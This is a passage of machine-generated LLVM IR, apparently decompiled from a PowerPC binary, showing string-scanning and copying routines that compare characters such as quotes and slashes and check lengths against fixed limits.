  %v3_100019e4 = inttoptr i32 %v2_100019e4 to i32*
  store i32 %v1_100019dc, i32* %v3_100019e4, align 4
  %v0_100019e8 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100019e8, i32* %r3.global-to-local, align 4
  store i32 268442096, i32* @lr, align 4
  %v1_100019ec = inttoptr i32 %v0_100019e8 to i8*
  %v2_100019ec = call i32 @function_1000ab64(i8* %v1_100019ec)
  store i32 %v2_100019ec, i32* %r3.global-to-local, align 4
  %v0_100019f0 = load i32, i32* %r29.global-to-local, align 4
  %v2_100019f0 = add i32 %v0_100019f0, %v2_100019ec
  store i32 %v2_100019f0, i32* %r29.global-to-local, align 4
  %v1_100019f4 = add i32 %v2_100019f0, -1
  %v2_100019f4 = inttoptr i32 %v1_100019f4 to i8*
  %v3_100019f4 = load i8, i8* %v2_100019f4, align 1
  %v4_100019f4 = zext i8 %v3_100019f4 to i32
  store i32 %v4_100019f4, i32* %r0.global-to-local, align 4
  %v1_100019f8 = icmp ult i8 %v3_100019f4, 34
  %v2_100019f8 = icmp ugt i8 %v3_100019f4, 34
  %v3_100019f8 = icmp eq i8 %v3_100019f4, 34
  store i1 %v1_100019f8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100019f8, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100019f8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100019f8, label %dec_label_pc_10001a00, label %dec_label_pc_100016e4

dec_label_pc_10001a00:                            ; preds = %dec_label_pc_100019dc
  %v0_10001a00 = load i32, i32* @r1, align 4
  %v1_10001a00 = add i32 %v0_10001a00, 8
  %v2_10001a00 = inttoptr i32 %v1_10001a00 to i32*
  %v3_10001a00 = load i32, i32* %v2_10001a00, align 4
  %v0_10001a04 = load i32, i32* @r28, align 4
  %v2_10001a04 = add i32 %v0_10001a04, %v3_10001a00
  store i32 %v2_10001a04, i32* %r29.global-to-local, align 4
  store i32 %v2_10001a04, i32* %r3.global-to-local, align 4
  store i32 268442128, i32* @lr, align 4
  %v1_10001a0c = inttoptr i32 %v2_10001a04 to i8*
  %v2_10001a0c = call i32 @function_1000ab64(i8* %v1_10001a0c)
  store i32 %v2_10001a0c, i32* %r3.global-to-local, align 4
  %v0_10001a10 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001a10 = add i32 %v0_10001a10, %v2_10001a0c
  store i32 %v2_10001a10, i32* %r29.global-to-local, align 4
  %v0_10001a14 = load i32, i32* %r26.global-to-local, align 4
  %v1_10001a14 = trunc i32 %v0_10001a14 to i8
  %v3_10001a14 = add i32 %v2_10001a10, -1
  %v4_10001a14 = inttoptr i32 %v3_10001a14 to i8*
  store i8 %v1_10001a14, i8* %v4_10001a14, align 1
  br label %dec_label_pc_100016e4

dec_label_pc_10001a1c:                            ; preds = %dec_label_pc_100011d8
  %v0_10001a1c = load i32, i32* @r30, align 4
  store i32 %v0_10001a1c, i32* @r3, align 4
  store i32 255, i32* @r4, align 4
  store i32 268442152, i32* @lr, align 4
  %v0_10001a24 = call i32 @function_1000ac0c()
  store i32 %v0_10001a24, i32* %r3.global-to-local, align 4
  %v0_10001a28 = load i32, i32* @r1, align 4
  %v1_10001a28 = add i32 %v0_10001a28, 8
  %v2_10001a28 = inttoptr i32 %v1_10001a28 to i32*
  %v3_10001a28 = load i32, i32* %v2_10001a28, align 4
  %v0_10001a2c = load i32, i32* %r29.global-to-local, align 4
  %v2_10001a2c = add i32 %v3_10001a28, 1
  %v1_10001a30 = add i32 %v2_10001a2c, %v0_10001a2c
  store i32 %v1_10001a30, i32* %r3.global-to-local, align 4
  store i32 268442168, i32* @lr, align 4
  %v1_10001a34 = inttoptr i32 %v1_10001a30 to i8*
  %v2_10001a34 = call i32 @function_1000ab64(i8* %v1_10001a34)
  store i32 %v2_10001a34, i32* %r3.global-to-local, align 4
  %v1_10001a38 = icmp slt i32 %v2_10001a34, 0
  %v2_10001a38 = icmp sgt i32 %v2_10001a34, 0
  %v3_10001a38 = icmp eq i32 %v2_10001a34, 0
  store i1 %v1_10001a38, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001a38, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001a38, i1* %cr7_eq.global-to-local, align 1
  %tmp88 = icmp slt i32 %v2_10001a34, 1
  br i1 %tmp88, label %dec_label_pc_100011e4, label %dec_label_pc_10001a40

dec_label_pc_10001a40:                            ; preds = %dec_label_pc_10001a1c
  %v0_10001a40 = load i32, i32* @r1, align 4
  %v1_10001a40 = add i32 %v0_10001a40, 8
  %v2_10001a40 = inttoptr i32 %v1_10001a40 to i32*
  %v3_10001a40 = load i32, i32* %v2_10001a40, align 4
  %v0_10001a44 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001a44 = add i32 %v3_10001a40, 1
  %v1_10001a48 = add i32 %v2_10001a44, %v0_10001a44
  store i32 %v1_10001a48, i32* %r3.global-to-local, align 4
  store i32 268442192, i32* @lr, align 4
  %v1_10001a4c = inttoptr i32 %v1_10001a48 to i8*
  %v2_10001a4c = call i32 @function_1000ab64(i8* %v1_10001a4c)
  store i32 %v2_10001a4c, i32* %r3.global-to-local, align 4
  %v1_10001a50 = icmp slt i32 %v2_10001a4c, 255
  %v2_10001a50 = icmp sgt i32 %v2_10001a4c, 255
  %v3_10001a50 = icmp eq i32 %v2_10001a4c, 255
  store i1 %v1_10001a50, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001a50, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001a50, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10001a50, label %dec_label_pc_100011e4, label %dec_label_pc_100018d8

dec_label_pc_10001a5c:                            ; preds = %dec_label_pc_100017fc
  store i32 8, i32* %r11.global-to-local, align 4
  %v1_10001a60 = load i32, i32* @r1, align 4
  %v2_10001a60 = add i32 %v1_10001a60, 8
  %v3_10001a60 = inttoptr i32 %v2_10001a60 to i32*
  store i32 8, i32* %v3_10001a60, align 4
  %v0_10001814.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10001810

dec_label_pc_10001a68:                            ; preds = %dec_label_pc_10001b4c, %dec_label_pc_10001b38
  %v2_10001a6c = phi i32 [ %v0_10001b3c, %dec_label_pc_10001b38 ], [ %v2_10001b5c, %dec_label_pc_10001b4c ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10001a6c = inttoptr i32 %v2_10001a6c to i8*
  store i8 0, i8* %v3_10001a6c, align 1
  br label %dec_label_pc_10001a70

dec_label_pc_10001a70:                            ; preds = %dec_label_pc_10001b58, %dec_label_pc_10001b0c, %dec_label_pc_10001a68
  %v0_10001a70 = load i32, i32* @r31, align 4
  store i32 %v0_10001a70, i32* %r3.global-to-local, align 4
  store i32 268442232, i32* @lr, align 4
  %v1_10001a74 = inttoptr i32 %v0_10001a70 to i8*
  %v2_10001a74 = call i32 @function_1000ab64(i8* %v1_10001a74)
  store i32 %v2_10001a74, i32* %r3.global-to-local, align 4
  %v1_10001a78 = icmp slt i32 %v2_10001a74, 0
  %v2_10001a78 = icmp sgt i32 %v2_10001a74, 0
  %v3_10001a78 = icmp eq i32 %v2_10001a74, 0
  store i1 %v1_10001a78, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001a78, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001a78, i1* %cr7_eq.global-to-local, align 1
  %tmp89 = icmp slt i32 %v2_10001a74, 1
  br i1 %tmp89, label %dec_label_pc_10001a9c, label %dec_label_pc_10001a80

dec_label_pc_10001a80:                            ; preds = %dec_label_pc_10001a70
  %v0_10001a80 = load i32, i32* @r31, align 4
  store i32 %v0_10001a80, i32* %r3.global-to-local, align 4
  store i32 268442248, i32* @lr, align 4
  %v1_10001a84 = inttoptr i32 %v0_10001a80 to i8*
  %v2_10001a84 = call i32 @function_1000ab64(i8* %v1_10001a84)
  store i32 %v2_10001a84, i32* %r3.global-to-local, align 4
  %v1_10001a88 = icmp slt i32 %v2_10001a84, 127
  %v2_10001a88 = icmp sgt i32 %v2_10001a84, 127
  %v3_10001a88 = icmp eq i32 %v2_10001a84, 127
  store i1 %v1_10001a88, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001a88, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001a88, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10001a88, label %dec_label_pc_10001a9c, label %dec_label_pc_10001a90

dec_label_pc_10001a90:                            ; preds = %dec_label_pc_10001a80
  %v0_10001a90 = load i32, i32* %r23.global-to-local, align 4
  %v1_10001a90 = add i32 %v0_10001a90, 789
  store i32 %v1_10001a90, i32* @r3, align 4
  %v0_10001a94 = load i32, i32* @r31, align 4
  store i32 %v0_10001a94, i32* %r4.global-to-local, align 4
  store i32 268442268, i32* %lr.global-to-local, align 4
  %v2_10001a98 = inttoptr i32 %v1_10001a90 to i8*
  %v3_10001a98 = call i32 @function_1000ab8c(i8* %v2_10001a98, i32 %v0_10001a94)
  store i32 %v3_10001a98, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001a9c

dec_label_pc_10001a9c:                            ; preds = %dec_label_pc_1000174c, %dec_label_pc_10001a80, %dec_label_pc_10001a70, %dec_label_pc_10001a90
  %v0_10001a9c = load i32, i32* @r1, align 4
  %v1_10001a9c = add i32 %v0_10001a9c, 8
  %v2_10001a9c = inttoptr i32 %v1_10001a9c to i32*
  %v3_10001a9c = load i32, i32* %v2_10001a9c, align 4
  %v0_10001aa0 = load i32, i32* @r31, align 4
  %v2_10001aa0 = add i32 %v3_10001a9c, 1
  %v1_10001aa4 = add i32 %v2_10001aa0, %v0_10001aa0
  store i32 %v1_10001aa4, i32* %r3.global-to-local, align 4
  store i32 268442284, i32* @lr, align 4
  %v1_10001aa8 = inttoptr i32 %v1_10001aa4 to i8*
  %v2_10001aa8 = call i32 @function_1000ab64(i8* %v1_10001aa8)
  store i32 %v2_10001aa8, i32* %r3.global-to-local, align 4
  %v1_10001aac = icmp slt i32 %v2_10001aa8, 255
  %v2_10001aac = icmp sgt i32 %v2_10001aa8, 255
  %v3_10001aac = icmp eq i32 %v2_10001aa8, 255
  store i1 %v1_10001aac, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001aac, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001aac, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10001aac, label %dec_label_pc_10001758, label %dec_label_pc_10001ab4

dec_label_pc_10001ab4:                            ; preds = %dec_label_pc_10001a9c
  %v0_10001ab4 = load i32, i32* @r30, align 4
  store i32 %v0_10001ab4, i32* @r3, align 4
  store i32 255, i32* @r4, align 4
  store i32 268442304, i32* @lr, align 4
  %v0_10001abc = call i32 @function_1000ac0c()
  store i32 %v0_10001abc, i32* %r3.global-to-local, align 4
  %v0_10001ac0 = load i32, i32* @r1, align 4
  %v1_10001ac0 = add i32 %v0_10001ac0, 8
  %v2_10001ac0 = inttoptr i32 %v1_10001ac0 to i32*
  %v3_10001ac0 = load i32, i32* %v2_10001ac0, align 4
  %v0_10001ac4 = load i32, i32* @r31, align 4
  %v2_10001ac4 = add i32 %v3_10001ac0, 1
  %v1_10001ac8 = add i32 %v2_10001ac4, %v0_10001ac4
  store i32 %v1_10001ac8, i32* %r3.global-to-local, align 4
  store i32 268442320, i32* @lr, align 4
  %v1_10001acc = inttoptr i32 %v1_10001ac8 to i8*
  %v2_10001acc = call i32 @function_1000ab64(i8* %v1_10001acc)
  store i32 %v2_10001acc, i32* %r3.global-to-local, align 4
  %v1_10001ad0 = icmp slt i32 %v2_10001acc, 0
  %v2_10001ad0 = icmp sgt i32 %v2_10001acc, 0
  %v3_10001ad0 = icmp eq i32 %v2_10001acc, 0
  store i1 %v1_10001ad0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001ad0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001ad0, i1* %cr7_eq.global-to-local, align 1
  %tmp90 = icmp slt i32 %v2_10001acc, 1
  br i1 %tmp90, label %dec_label_pc_10001758, label %dec_label_pc_10001ad8

dec_label_pc_10001ad8:                            ; preds = %dec_label_pc_10001ab4
  %v0_10001ad8 = load i32, i32* @r1, align 4
  %v1_10001ad8 = add i32 %v0_10001ad8, 8
  %v2_10001ad8 = inttoptr i32 %v1_10001ad8 to i32*
  %v3_10001ad8 = load i32, i32* %v2_10001ad8, align 4
  %v0_10001adc = load i32, i32* @r30, align 4
  store i32 %v0_10001adc, i32* @r3, align 4
  %v0_10001ae0 = load i32, i32* @r31, align 4
  %v2_10001ae0 = add i32 %v3_10001ad8, 1
  %v1_10001ae4 = add i32 %v2_10001ae0, %v0_10001ae0
  store i32 %v1_10001ae4, i32* %r4.global-to-local, align 4
  store i32 268442348, i32* %lr.global-to-local, align 4
  %v2_10001ae8 = inttoptr i32 %v0_10001adc to i8*
  %v3_10001ae8 = call i32 @function_1000ab8c(i8* %v2_10001ae8, i32 %v1_10001ae4)
  store i32 %v3_10001ae8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001758

dec_label_pc_10001af0:                            ; preds = %dec_label_pc_10001720
  store i32 7, i32* %r11.global-to-local, align 4
  %v1_10001af4 = load i32, i32* @r1, align 4
  %v2_10001af4 = add i32 %v1_10001af4, 8
  %v3_10001af4 = inttoptr i32 %v2_10001af4 to i32*
  store i32 7, i32* %v3_10001af4, align 4
  %v0_10001af8 = load i32, i32* @r31, align 4
  %v1_10001af8 = add i32 %v0_10001af8, 4
  %v2_10001af8 = inttoptr i32 %v1_10001af8 to i8*
  %v3_10001af8 = load i8, i8* %v2_10001af8, align 1
  %v4_10001af8 = zext i8 %v3_10001af8 to i32
  store i32 %v4_10001af8, i32* %r0.global-to-local, align 4
  %v1_10001afc = icmp ult i8 %v3_10001af8, 115
  %v2_10001afc = icmp ugt i8 %v3_10001af8, 115
  %v3_10001afc = icmp eq i8 %v3_10001af8, 115
  store i1 %v1_10001afc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001afc, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001afc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001afc, label %dec_label_pc_10001b04, label %dec_label_pc_10001b0c

dec_label_pc_10001b04:                            ; preds = %dec_label_pc_10001af0
  store i32 8, i32* %r11.global-to-local, align 4
  %v1_10001b08 = load i32, i32* @r1, align 4
  %v2_10001b08 = add i32 %v1_10001b08, 8
  %v3_10001b08 = inttoptr i32 %v2_10001b08 to i32*
  store i32 8, i32* %v3_10001b08, align 4
  %v0_10001b14.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10001b0c

dec_label_pc_10001b0c:                            ; preds = %dec_label_pc_10001af0, %dec_label_pc_10001b04
  %v0_10001b14 = phi i32 [ %v0_10001af8, %dec_label_pc_10001af0 ], [ %v0_10001b14.pre, %dec_label_pc_10001b04 ]
  %v0_10001b0c = load i32, i32* @r1, align 4
  %v1_10001b0c = add i32 %v0_10001b0c, 8
  %v2_10001b0c = inttoptr i32 %v1_10001b0c to i32*
  %v3_10001b0c = load i32, i32* %v2_10001b0c, align 4
  %v0_10001b10 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10001b14, i32* %r3.global-to-local, align 4
  %v1_10001b10 = sub i32 1, %v3_10001b0c
  %v2_10001b18 = add i32 %v1_10001b10, %v0_10001b10
  %v2_10001b1c = add i32 %v3_10001b0c, %v0_10001b14
  store i32 %v2_10001b1c, i32* %r4.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10001b24.49 to i32), i32* @lr, align 4
  %v3_10001b20 = call i32 @function_1000bbec(i32 %v0_10001b14, i32 %v2_10001b1c, i32 %v2_10001b18)
  store i32 %v3_10001b20, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_10001b28 = load i32, i32* @r1, align 4
  %v2_10001b28 = add i32 %v1_10001b28, 8
  %v3_10001b28 = inttoptr i32 %v2_10001b28 to i32*
  store i32 0, i32* %v3_10001b28, align 4
  %v0_10001b2c = load i32, i32* @r28, align 4
  %v1_10001b2c = load i32, i32* %r29.global-to-local, align 4
  %v2_10001b2c = add i32 %v1_10001b2c, %v0_10001b2c
  %v3_10001b2c = inttoptr i32 %v2_10001b2c to i8*
  %v4_10001b2c = load i8, i8* %v3_10001b2c, align 1
  %v5_10001b2c = zext i8 %v4_10001b2c to i32
  store i32 %v5_10001b2c, i32* %r3.global-to-local, align 4
  %v2_10001b30 = icmp ne i8 %v4_10001b2c, 0
  %v3_10001b30 = icmp eq i8 %v4_10001b2c, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001b30, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001b30, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001b30, label %dec_label_pc_10001a70, label %dec_label_pc_10001b38

dec_label_pc_10001b38:                            ; preds = %dec_label_pc_10001b0c
  %v1_10001b38 = icmp ult i8 %v4_10001b2c, 47
  %v2_10001b38 = icmp ugt i8 %v4_10001b2c, 47
  %v3_10001b38 = icmp eq i8 %v4_10001b2c, 47
  store i1 %v1_10001b38, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001b38, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001b38, i1* %cr7_eq.global-to-local, align 1
  %v0_10001b3c = load i32, i32* @r31, align 4
  store i32 %v0_10001b3c, i32* %r11.global-to-local, align 4
  br i1 %v3_10001b38, label %dec_label_pc_10001a68, label %dec_label_pc_10001b44

dec_label_pc_10001b44:                            ; preds = %dec_label_pc_10001b38
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10001b58

dec_label_pc_10001b4c:                            ; preds = %dec_label_pc_10001b58
  %v1_10001b4c = icmp ult i8 %v4_10001b60, 47
  %v2_10001b4c = icmp ugt i8 %v4_10001b60, 47
  %v3_10001b4c = icmp eq i8 %v4_10001b60, 47
  store i1 %v1_10001b4c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001b4c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001b4c, i1* %cr7_eq.global-to-local, align 1
  %v1_10001b50 = add i32 %v1_10001b5c, 1
  store i32 %v1_10001b50, i32* %r9.global-to-local, align 4
  br i1 %v3_10001b4c, label %dec_label_pc_10001a68, label %dec_label_pc_10001b58

dec_label_pc_10001b58:                            ; preds = %dec_label_pc_10001b4c, %dec_label_pc_10001b44
  %v0_10001b58 = phi i32 [ %v1_10001b50, %dec_label_pc_10001b4c ], [ 1, %dec_label_pc_10001b44 ]
  %v1_10001b58 = load i32, i32* @r1, align 4
  %v2_10001b58 = add i32 %v1_10001b58, 8
  %v3_10001b58 = inttoptr i32 %v2_10001b58 to i32*
  store i32 %v0_10001b58, i32* %v3_10001b58, align 4
  %v0_10001b5c = load i32, i32* @r31, align 4
  %v1_10001b5c = load i32, i32* %r9.global-to-local, align 4
  %v2_10001b5c = add i32 %v1_10001b5c, %v0_10001b5c
  store i32 %v2_10001b5c, i32* %r11.global-to-local, align 4
  %v3_10001b60 = inttoptr i32 %v2_10001b5c to i8*
  %v4_10001b60 = load i8, i8* %v3_10001b60, align 1
  %v5_10001b60 = zext i8 %v4_10001b60 to i32
  store i32 %v5_10001b60, i32* %r0.global-to-local, align 4
  %v2_10001b64 = icmp ne i8 %v4_10001b60, 0
  %v3_10001b64 = icmp eq i8 %v4_10001b60, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001b64, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001b64, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001b64, label %dec_label_pc_10001a70, label %dec_label_pc_10001b4c

dec_label_pc_10001b70:                            ; preds = %dec_label_pc_100014d0
  %v0_10001b70 = load i32, i32* %r29.global-to-local, align 4
  %v1_10001b70 = trunc i32 %v0_10001b70 to i8
  %v2_10001b70 = load i32, i32* @r30, align 4
  %v3_10001b70 = add i32 %v2_10001b70, -529
  %v4_10001b70 = inttoptr i32 %v3_10001b70 to i8*
  store i8 %v1_10001b70, i8* %v4_10001b70, align 1
  br label %dec_label_pc_10000824

dec_label_pc_10001b78:                            ; preds = %dec_label_pc_10001934
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10001b7c = load i32, i32* @r30, align 4
  %v3_10001b7c = add i32 %v2_10001b7c, -529
  %v4_10001b7c = inttoptr i32 %v3_10001b7c to i8*
  store i8 1, i8* %v4_10001b7c, align 1
  br label %dec_label_pc_100017bc

dec_label_pc_10001b84:                            ; preds = %dec_label_pc_10001660
  %v1_10001b84 = add i32 %v1_10001674, 1
  store i32 %v1_10001b84, i32* %r11.global-to-local, align 4
  %v1_10001b88 = load i32, i32* @r1, align 4
  %v2_10001b88 = add i32 %v1_10001b88, 8
  %v3_10001b88 = inttoptr i32 %v2_10001b88 to i32*
  store i32 %v1_10001b84, i32* %v3_10001b88, align 4
  %v0_10001680.pre = load i32, i32* @r28, align 4
  %v1_10001680.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10001680

dec_label_pc_10001b90:                            ; preds = %dec_label_pc_10001948
  %v0_10001b90 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10001b90, i32* %r3.global-to-local, align 4
  store i32 268442520, i32* @lr, align 4
  %v1_10001b94 = inttoptr i32 %v0_10001b90 to i8*
  %v2_10001b94 = call i32 @function_1000ab64(i8* %v1_10001b94)
  store i32 %v2_10001b94, i32* %r3.global-to-local, align 4
  %v1_10001b98 = icmp slt i32 %v2_10001b94, 127
  %v2_10001b98 = icmp sgt i32 %v2_10001b94, 127
  %v3_10001b98 = icmp eq i32 %v2_10001b94, 127
  store i1 %v1_10001b98, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001b98, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001b98, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10001b98, label %dec_label_pc_100019ac, label %dec_label_pc_10001ba0

dec_label_pc_10001ba0:                            ; preds = %dec_label_pc_10001b90
  %v0_10001ba0 = load i32, i32* @r30, align 4
  %v1_10001ba0 = add i32 %v0_10001ba0, 935
  %v2_10001ba0 = inttoptr i32 %v1_10001ba0 to i32*
  %v3_10001ba0 = load i32, i32* %v2_10001ba0, align 4
  store i32 %v3_10001ba0, i32* %r3.global-to-local, align 4
  %v0_10001ba4 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10001ba4, i32* %r4.global-to-local, align 4
  %v0_10001ba8 = load i32, i32* @r1, align 4
  %v1_10001ba8 = add i32 %v0_10001ba8, 20808
  %v2_10001ba8 = inttoptr i32 %v1_10001ba8 to i32*
  %v3_10001ba8 = load i32, i32* %v2_10001ba8, align 4
  store i32 %v3_10001ba8, i32* %r0.global-to-local, align 4
  %v0_10001bac = load i32, i32* %r28.global-to-local, align 4
  %v1_10001bac = add i32 %v0_10001bac, 3
  store i32 %v1_10001bac, i32* %r28.global-to-local, align 4
  %v1_10001bb0 = mul i32 %v3_10001ba0, 128
  %v0_10001bb4 = load i32, i32* %r27.global-to-local, align 4
  %v2_10001bb4 = add i32 %v0_10001bb4, %v1_10001bac
  store i32 %v2_10001bb4, i32* %r27.global-to-local, align 4
  %v2_10001bb8 = add i32 %v3_10001ba8, %v1_10001bb0
  store i32 %v2_10001bb8, i32* @r3, align 4
  store i32 268442560, i32* %lr.global-to-local, align 4
  %v2_10001bbc = inttoptr i32 %v2_10001bb8 to i8*
  %v3_10001bbc = call i32 @function_1000ab8c(i8* %v2_10001bbc, i32 %v0_10001ba4)
  store i32 %v3_10001bbc, i32* %r3.global-to-local, align 4
  %v0_10001bc0 = load i32, i32* @r30, align 4
  %v1_10001bc0 = add i32 %v0_10001bc0, 935
  %v2_10001bc0 = inttoptr i32 %v1_10001bc0 to i32*
  %v3_10001bc0 = load i32, i32* %v2_10001bc0, align 4
  store i32 %v3_10001bc0, i32* %r29.global-to-local, align 4
  %v0_10001bc4 = load i32, i32* @r1, align 4
  %v1_10001bc4 = add i32 %v0_10001bc4, 20808
  %v2_10001bc4 = inttoptr i32 %v1_10001bc4 to i32*
  %v3_10001bc4 = load i32, i32* %v2_10001bc4, align 4
  store i32 %v3_10001bc4, i32* %r0.global-to-local, align 4
  %v1_10001bc8 = mul i32 %v3_10001bc0, 128
  %v2_10001bcc = add i32 %v3_10001bc4, %v1_10001bc8
  store i32 %v2_10001bcc, i32* %r29.global-to-local, align 4
  store i32 %v2_10001bcc, i32* %r3.global-to-local, align 4
  store i32 268442584, i32* @lr, align 4
  %v1_10001bd4 = inttoptr i32 %v2_10001bcc to i8*
  %v2_10001bd4 = call i32 @function_1000ab64(i8* %v1_10001bd4)
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000de80.50 to i32), i32* %r4.global-to-local, align 4
  %v0_10001be0 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001be0 = add i32 %v0_10001be0, %v2_10001bd4
  store i32 %v2_10001be0, i32* @r3, align 4
  store i32 268442600, i32* %lr.global-to-local, align 4
  %v2_10001be4 = inttoptr i32 %v2_10001be0 to i8*
  %v3_10001be4 = call i32 @function_1000ab8c(i8* %v2_10001be4, i32 ptrtoint (i32* @global_var_1000de80.50 to i32))
  store i32 %v3_10001be4, i32* %r3.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_10001bec = load i32, i32* @r30, align 4
  %v1_10001bec = add i32 %v0_10001bec, 1579
  %v2_10001bec = inttoptr i32 %v1_10001bec to i32*
  %v3_10001bec = load i32, i32* %v2_10001bec, align 4
  %v0_10001bf8 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10001bf8, i32* %r3.global-to-local, align 4
  %v0_10001bfc = load i32, i32* %r28.global-to-local, align 4
  %v2_10001bfc = sub i32 %v3_10001bec, %v0_10001bfc
  store i32 %v2_10001bfc, i32* %r4.global-to-local, align 4
  %v1_10001c00 = load i32, i32* %r23.global-to-local, align 4
  %v2_10001c00 = add i32 %v1_10001c00, %v0_10001bfc
  store i32 %v2_10001c00, i32* %r28.global-to-local, align 4
  store i32 268442632, i32* %lr.global-to-local, align 4
  %v4_10001c04 = call i32 @function_1000ac30(i32 %v0_10001bf8, i32 %v2_10001bfc, i32 ptrtoint (i32* @global_var_1000de7c.47 to i32), i32 1)
  store i32 %v4_10001c04, i32* %r3.global-to-local, align 4
  %v0_10001c08 = load i32, i32* @r30, align 4
  %v1_10001c08 = add i32 %v0_10001c08, 935
  %v2_10001c08 = inttoptr i32 %v1_10001c08 to i32*
  %v3_10001c08 = load i32, i32* %v2_10001c08, align 4
  store i32 %v3_10001c08, i32* %r29.global-to-local, align 4
  %v0_10001c0c = load i32, i32* @r1, align 4
  %v1_10001c0c = add i32 %v0_10001c0c, 20808
  %v2_10001c0c = inttoptr i32 %v1_10001c0c to i32*
  %v3_10001c0c = load i32, i32* %v2_10001c0c, align 4
  store i32 %v3_10001c0c, i32* %r0.global-to-local, align 4
  %v0_10001c10 = load i32, i32* %r28.global-to-local, align 4
  %v2_10001c10 = add i32 %v0_10001c10, %v4_10001c04
  %v1_10001c14 = mul i32 %v3_10001c08, 128
  %v1_10001c18 = add i32 %v2_10001c10, 2111
  store i32 %v1_10001c18, i32* %r28.global-to-local, align 4
  %v2_10001c1c = add i32 %v3_10001c0c, %v1_10001c14
  store i32 %v2_10001c1c, i32* %r29.global-to-local, align 4
  %v0_10001c20 = load i32, i32* %r26.global-to-local, align 4
  %v1_10001c20 = trunc i32 %v0_10001c20 to i8
  %v3_10001c20 = add i32 %v2_10001c10, 2115
  %v4_10001c20 = inttoptr i32 %v3_10001c20 to i8*
  store i8 %v1_10001c20, i8* %v4_10001c20, align 1
  %v0_10001c24 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10001c24, i32* %r3.global-to-local, align 4
  store i32 268442668, i32* @lr, align 4
  %v1_10001c28 = inttoptr i32 %v0_10001c24 to i8*
  %v2_10001c28 = call i32 @function_1000ab64(i8* %v1_10001c28)
  %v0_10001c2c = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10001c2c, i32* %r4.global-to-local, align 4
  %v0_10001c30 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001c30 = add i32 %v0_10001c30, %v2_10001c28
  store i32 %v2_10001c30, i32* @r3, align 4
  store i32 268442680, i32* %lr.global-to-local, align 4
  %v2_10001c34 = inttoptr i32 %v2_10001c30 to i8*
  %v3_10001c34 = call i32 @function_1000ab8c(i8* %v2_10001c34, i32 %v0_10001c2c)
  store i32 %v3_10001c34, i32* %r3.global-to-local, align 4
  %v0_10001c38 = load i32, i32* @r30, align 4
  %v1_10001c38 = add i32 %v0_10001c38, 935
  %v2_10001c38 = inttoptr i32 %v1_10001c38 to i32*
  %v3_10001c38 = load i32, i32* %v2_10001c38, align 4
  %v1_10001c3c = add i32 %v3_10001c38, 1
  store i32 %v1_10001c3c, i32* %r9.global-to-local, align 4
  store i32 %v1_10001c3c, i32* %v2_10001c38, align 4
  br label %dec_label_pc_100019ac

dec_label_pc_10001c70:                            ; preds = %dec_label_pc_10000578
  %v0_10001c70 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10001c70, i32* @r3, align 4
  %v0_10001c74 = load i32, i32* %r28.global-to-local, align 4
  %v1_10001c74 = add i32 %v0_10001c74, 1
  store i32 %v1_10001c74, i32* %r28.global-to-local, align 4
  %v0_10001c78 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10001c78, i32* %r4.global-to-local, align 4
  %v0_10001c7c = load i32, i32* @r31, align 4
  %v1_10001c7c = add i32 %v0_10001c7c, 3140
